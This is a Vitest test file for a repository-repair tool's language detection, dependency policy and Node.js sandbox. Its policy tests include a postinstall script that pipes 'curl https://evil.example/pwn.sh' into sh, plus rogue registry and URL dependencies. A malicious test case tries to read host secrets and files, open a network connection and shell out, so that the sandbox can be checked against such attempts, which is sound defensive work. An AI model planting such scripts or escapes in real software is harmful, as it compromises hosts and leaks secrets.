import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { NextRequest } from "next/server";
import {
  buildIngestedRepositoryMetadata,
  detectProjectLanguageAndFramework,
  evaluateNodeDependencyPolicy,
} from "../necro-engine";
import {
  clearSandboxJobsForTest,
  diagnoseRepository,
  resurrectRepository,
} from "../necro-engine/server";
import { POST as sandboxExecutePost } from "@/app/api/sandbox/execute/route";
import { createWorkerServer } from "../../../sandbox-worker/server.mjs";
import {
  detectNodeSandboxDriver,
  runIsolatedNodeJob,
} from "../../../sandbox-worker/node/executor.mjs";

const nodeDriver = detectNodeSandboxDriver();
const hasNodeSandbox = nodeDriver.driver !== "unavailable";

describe("Phase 4A: Multi-Language Detection, Node Dependency Policy & Isolated JS/TS Sandbox", () => {
  beforeEach(() => {
    clearSandboxJobsForTest();
  });

  afterEach(() => {
    delete process.env.SANDBOX_WORKER_URL;
    delete process.env.SANDBOX_WORKER_TOKEN;
    delete process.env.NODE_SANDBOX_WORKER_URL;
    delete process.env.NODE_SANDBOX_WORKER_TOKEN;
    delete process.env.TEST_HOST_SECRET_CANARY;
  });

  describe("Language & Framework Detection", () => {
    it("detects Next.js, Vite, NestJS, Express, mixed JS+TS, Python, and unsupported repos", () => {
      const nextProfile = detectProjectLanguageAndFramework([
        { path: "package.json", content: JSON.stringify({ dependencies: { next: "15.0.0", react: "19.0.0" } }) },
        { path: "next.config.mjs", content: "export default {};" },
        { path: "tsconfig.json", content: "{}" },
        { path: "src/app/page.tsx", content: "export default function Page() { return null; }" },
      ]);
      expect(nextProfile.primaryLanguage).toBe("typescript");
      expect(nextProfile.runtime).toBe("nodejs20");
      expect(nextProfile.detectedFrameworks).toContain("Next.js");
      expect(nextProfile.detectedFrameworks).toContain("React");
      expect(nextProfile.supportedVerificationCapabilities.typeCheck).toBe(true);

      const nestProfile = detectProjectLanguageAndFramework([
        { path: "package.json", content: JSON.stringify({ dependencies: { "@nestjs/core": "10.0.0" } }) },
        { path: "nest-cli.json", content: "{}" },
        { path: "src/main.ts", content: "export const x: number = 1;" },
      ]);
      expect(nestProfile.detectedFrameworks).toContain("NestJS");

      const viteExpressProfile = detectProjectLanguageAndFramework([
        { path: "package.json", content: JSON.stringify({ dependencies: { express: "4.19.0" }, devDependencies: { vite: "5.0.0" } }) },
        { path: "vite.config.js", content: "export default {};" },
        { path: "server.js", content: "const x = 1;" },
      ]);
      expect(viteExpressProfile.detectedFrameworks).toContain("Express");
      expect(viteExpressProfile.detectedFrameworks).toContain("Vite");

      const mixedProfile = detectProjectLanguageAndFramework([
        { path: "app.ts", content: "export const a: number = 1;" },
        { path: "legacy.js", content: "module.exports = { b: 2 };" },
      ]);
      expect(mixedProfile.primaryLanguage).toBe("mixed");
      expect(mixedProfile.runtime).toBe("nodejs20");

      const unsupportedProfile = detectProjectLanguageAndFramework([
        { path: "main.go", content: "package main\nfunc main() {}" },
      ]);
      expect(unsupportedProfile.primaryLanguage).toBe("unsupported");
      expect(unsupportedProfile.supportedVerificationCapabilities.syntaxCheck).toBe(false);
    });
  });

  describe("Controlled Node.js Dependency Policy", () => {
    it("blocks lifecycle scripts, custom registries, git/URL/file dependencies, and conflicting lockfiles", () => {
      const lifecycleAttack = evaluateNodeDependencyPolicy([
        {
          path: "package.json",
          content: JSON.stringify({
            name: "evil-pkg",
            scripts: { postinstall: "curl https://evil.example/pwn.sh | sh" },
          }),
        },
      ]);
      expect(lifecycleAttack.status).toBe("DEPENDENCY_PREPARATION_FAILED");
      expect(lifecycleAttack.safeToExecute).toBe(false);

      const gitAttack = evaluateNodeDependencyPolicy([
        {
          path: "package.json",
          content: JSON.stringify({
            name: "git-dep",
            dependencies: { evil: "git+https://github.com/evil/repo.git" },
          }),
        },
      ]);
      expect(gitAttack.status).toBe("DEPENDENCY_PREPARATION_FAILED");

      const urlAndLocalAttack = evaluateNodeDependencyPolicy([
        {
          path: "package.json",
          content: JSON.stringify({
            name: "url-dep",
            dependencies: { a: "https://evil.example/a.tgz", b: "file:../host" },
          }),
        },
      ]);
      expect(urlAndLocalAttack.status).toBe("DEPENDENCY_PREPARATION_FAILED");

      const npmrcAttack = evaluateNodeDependencyPolicy([
        { path: ".npmrc", content: "registry=https://rogue-registry.example/\n" },
        { path: "package.json", content: JSON.stringify({ name: "reg-override" }) },
      ]);
      expect(npmrcAttack.status).toBe("DEPENDENCY_PREPARATION_FAILED");

      const lockConflict = evaluateNodeDependencyPolicy([
        { path: "package.json", content: JSON.stringify({ name: "conflict" }) },
        { path: "package-lock.json", content: "{}" },
        { path: "yarn.lock", content: "" },
      ]);
      expect(lockConflict.status).toBe("DEPENDENCY_PREPARATION_FAILED");

      const safeBuiltinTs = evaluateNodeDependencyPolicy([
        {
          path: "package.json",
          content: JSON.stringify({
            name: "clean-ts",
            devDependencies: { typescript: "5.9.3" },
          }),
        },
      ]);
      expect(safeBuiltinTs.status).toBe("TYPESCRIPT_BUILTIN_READY");
      expect(safeBuiltinTs.safeToExecute).toBe(true);
    });
  });

  describe("End-to-End Sample Repositories & Unified Sandbox Routing", () => {
    it.skipIf(!hasNodeSandbox)(
      "1. JavaScript healthy project: executes node:test tests and returns RESURRECTED",
      async () => {
        const workerToken = "node-e2e-token-1";
        const server = createWorkerServer({ token: workerToken });
        await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
        const addr = server.address();
        if (!addr || typeof addr === "string") throw new Error("No port");
        process.env.SANDBOX_WORKER_URL = `http://127.0.0.1:${addr.port}`;
        process.env.SANDBOX_WORKER_TOKEN = workerToken;

        try {
          const res = await sandboxExecutePost(
            new NextRequest("http://localhost:3000/api/sandbox/execute", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                repositoryName: "sample/js-healthy",
                files: [
                  { path: "package.json", content: JSON.stringify({ name: "js-healthy", type: "module" }) },
                  { path: "math.js", content: "export function multiply(a, b) { return a * b; }\n" },
                  {
                    path: "math.test.js",
                    content: [
                      "import test from 'node:test';",
                      "import assert from 'node:assert/strict';",
                      "import { multiply } from './math.js';",
                      "test('multiply works', () => assert.equal(multiply(3, 4), 12));",
                    ].join("\n"),
                  },
                ],
              }),
            })
          );

          expect(res.status).toBe(200);
          const json = (await res.json()) as {
            language: string;
            runtime: string;
            resurrectionState: string;
            totalTests: number;
            passedTests: number;
            cleanupVerified: boolean;
          };
          expect(json.language).toBe("javascript");
          expect(json.runtime).toBe("nodejs20");
          expect(json.resurrectionState).toBe("RESURRECTED");
          expect(json.totalTests).toBe(1);
          expect(json.passedTests).toBe(1);
          expect(json.cleanupVerified).toBe(true);
        } finally {
          server.closeAllConnections?.();
          await new Promise<void>((resolve) => server.close(() => resolve()));
        }
      },
      15_000
    );

    it.skipIf(!hasNodeSandbox)(
      "2. JavaScript broken project: diagnoses CVE/CJS issues, repairs deterministically, and passes sandbox",
      async () => {
        const brokenRepo = buildIngestedRepositoryMetadata({
          id: "sample_js_broken",
          source: "custom",
          name: "sample/js-broken",
          files: [
            {
              path: "package.json",
              content: JSON.stringify({ name: "js-broken", type: "module" }),
              sizeBytes: 40,
              language: "manifest",
              isTestFile: false,
              isDependencyManifest: true,
            },
            {
              path: "hasher.js",
              content: [
                "function encode(text) {",
                "  return new Buffer(text).toString('hex');",
                "}",
                "module.exports = { encode: encode };",
              ].join("\n"),
              sizeBytes: 100,
              language: "javascript",
              isTestFile: false,
              isDependencyManifest: false,
            },
            {
              path: "hasher.test.js",
              content: [
                "import test from 'node:test';",
                "import assert from 'node:assert/strict';",
                "import { encode } from './hasher.js';",
                "test('encodes hex', () => assert.equal(encode('hi'), '6869'));",
              ].join("\n"),
              sizeBytes: 120,
              language: "javascript",
              isTestFile: true,
              isDependencyManifest: false,
            },
          ],
          totalBytes: 260,
          truncated: false,
          skippedCount: 0,
          warnings: [],
        });

        const diag = diagnoseRepository(brokenRepo);
        expect(diag.findings.some((f) => f.finding === "UNSAFE_BUFFER_ALLOCATION")).toBe(true);
        expect(diag.findings.some((f) => f.finding === "COMMONJS_EXPORT")).toBe(true);

        const repair = await resurrectRepository({
          repository: brokenRepo,
          diagnosis: diag,
          useAi: false,
        });
        const hasherPatch = repair.patches.find((p) => p.filePath === "hasher.js")!;
        expect(hasherPatch.status).toBe("valid");
        expect(hasherPatch.proposedContent).toContain("Buffer.from(text, 'utf-8')");
        expect(hasherPatch.proposedContent).toContain("export { encode };");

        const sbxRes = await runIsolatedNodeJob({
          files: [
            { path: "package.json", content: brokenRepo.files[0].content },
            { path: "hasher.js", content: hasherPatch.proposedContent },
            { path: "hasher.test.js", content: brokenRepo.files[2].content },
          ],
        });
        expect(sbxRes.status).toBe("PASSED");
        expect(sbxRes.passedTests).toBe(1);
      },
      15_000
    );

    it.skipIf(!hasNodeSandbox)(
      "3. TypeScript healthy project & 4. TypeScript broken project (tsc --noEmit diagnostics)",
      async () => {
        const healthyTs = await runIsolatedNodeJob({
          files: [
            {
              path: "tsconfig.json",
              content: JSON.stringify({
                compilerOptions: {
                  strict: true,
                  target: "ES2022",
                  module: "CommonJS",
                  esModuleInterop: true,
                },
              }),
            },
            {
              path: "greeter.ts",
              content: "export function greet(name: string): string { return `Hello, ${name}`; }\n",
            },
            {
              path: "greeter.test.ts",
              content: [
                "import test from 'node:test';",
                "import assert from 'node:assert/strict';",
                "import { greet } from './greeter';",
                "test('greets user', () => assert.equal(greet('Necro'), 'Hello, Necro'));",
              ].join("\n"),
            },
          ],
        });
        expect(healthyTs.syntaxValid).toBe(true);
        expect(healthyTs.status).toBe("PASSED");
        expect(healthyTs.passedTests).toBe(1);

        // Broken TypeScript project with real TS2322 type mismatch
        const brokenTsRepo = buildIngestedRepositoryMetadata({
          id: "sample_ts_broken",
          source: "custom",
          name: "sample/ts-broken",
          files: [
            {
              path: "broken.ts",
              content: "export function sum(a: number, b: number): number {\n  return 'not-a-number';\n}\n",
              sizeBytes: 70,
              language: "typescript",
              isTestFile: false,
              isDependencyManifest: false,
            },
          ],
          totalBytes: 70,
          truncated: false,
          skippedCount: 0,
          warnings: [],
        });

        const tsDiag = diagnoseRepository(brokenTsRepo);
        expect(tsDiag.tsDiagnostics?.some((d) => d.code === "TS2322")).toBe(true);

        const brokenSbx = await runIsolatedNodeJob({
          files: [{ path: "broken.ts", content: brokenTsRepo.files[0].content }],
        });
        expect(brokenSbx.syntaxValid).toBe(false);
        expect(brokenSbx.status).toBe("FAILED");
        expect(
          brokenSbx.tsDiagnostics.some((d: { code: string }) => d.code === "TS2322")
        ).toBe(true);

        // Valid TS file with zero tests returns NO_TESTS_FOUND (never false RESURRECTED)
        const noTestsTs = await runIsolatedNodeJob({
          files: [{ path: "pure.ts", content: "export const version: number = 2;\n" }],
        });
        expect(noTestsTs.syntaxValid).toBe(true);
        expect(noTestsTs.status).toBe("NO_TESTS_FOUND");
      },
      15_000
    );

    it.skipIf(!hasNodeSandbox)(
      "5. Malicious Node.js project: blocks host secrets, host reads/writes, network, child_process escapes, infinite loops, and log floods",
      async () => {
        process.env.TEST_HOST_SECRET_CANARY = "node-secret-canary";
        const hostEscapePath = path.join(os.tmpdir(), `necro_node_escape_${Date.now()}.txt`);
        const hostPkgPath = path.resolve(process.cwd(), "package.json");

        const maliciousRes = await runIsolatedNodeJob({
          timeoutMs: 6000,
          files: [
            {
              path: "security.test.mjs",
              content: [
                "import test from 'node:test';",
                "import assert from 'node:assert/strict';",
                "import fs from 'node:fs';",
                "import net from 'node:net';",
                "import { execSync } from 'node:child_process';",
                "test('blocks host env secrets', () => {",
                "  assert.equal(process.env.TEST_HOST_SECRET_CANARY, undefined);",
                "  assert.equal(process.env.GEMINI_API_KEY, undefined);",
                "  assert.equal(process.env.SANDBOX_WORKER_TOKEN, undefined);",
                "});",
                "test('blocks host file read & write', () => {",
                `  assert.throws(() => fs.readFileSync(${JSON.stringify(hostPkgPath)}, 'utf8'));`,
                `  assert.throws(() => fs.writeFileSync(${JSON.stringify(hostEscapePath)}, 'pwn'));`,
                "});",
                "test('blocks outbound network', async () => {",
                "  await assert.rejects(() => new Promise((res, rej) => {",
                "    const s = net.connect(80, '1.1.1.1', () => res('open'));",
                "    s.on('error', rej);",
                "  }));",
                "});",
                "test('child_process cannot read host secrets', () => {",
                `  assert.throws(() => execSync('cat ' + ${JSON.stringify(hostPkgPath)}));`,
                "});",
              ].join("\n"),
            },
          ],
        });

        expect(fs.existsSync(hostEscapePath)).toBe(false);
        expect(maliciousRes.status).toBe("PASSED");
        expect(maliciousRes.passedTests).toBe(4);
        expect(maliciousRes.cleanupVerified).toBe(true);

        // Infinite loop timeout + cleanup check
        const loopRes = await runIsolatedNodeJob({
          timeoutMs: 1200,
          files: [
            {
              path: "loop.test.mjs",
              content: "import test from 'node:test'; test('loop', () => { while (true) {} });\n",
            },
          ],
        });
        expect(loopRes.timedOut).toBe(true);
        expect(loopRes.status).toBe("FAILED");
        expect(loopRes.cleanupVerified).toBe(true);

        // Oversized output flood
        const floodRes = await runIsolatedNodeJob({
          timeoutMs: 4000,
          files: [
            {
              path: "flood.test.mjs",
              content:
                "import test from 'node:test'; test('flood', () => { console.log('X'.repeat(150000)); });\n",
            },
          ],
        });
        expect(floodRes.outputTruncated).toBe(true);
        expect(floodRes.status).toBe("FAILED");
      },
      20_000
    );
  });
});
